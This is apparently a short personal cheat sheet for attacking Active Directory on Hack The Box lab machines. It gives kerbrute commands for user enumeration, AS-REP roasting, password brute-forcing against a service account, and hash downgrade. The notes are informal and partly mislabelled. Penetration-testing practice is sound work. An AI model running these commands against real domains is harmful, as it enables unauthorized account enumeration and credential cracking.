ldapsearh (find user principal name and service name) --> valid users via kerbrute / or nmap (for keberoasting)


**verify vaild users**

```sh
kerbrute --dc 10.10.10.161 -d htb.local userenum validuser-list
```

**finding password hash via service user**
`got service user name via ASREPRoasting`

```sh
 kerbrute --dc 10.10.10.161 -d htb.local userenum sname.txt
```


**verify password**
```sh
kerbrute bruteuser --dc 10.10.10.100 -d active.htb password.txt SVC_TGS
```

**downgrade hash**

```sh
kerbrute --dc 10.10.10.161 -d htb.local userenum sname.txt --downgrade
```
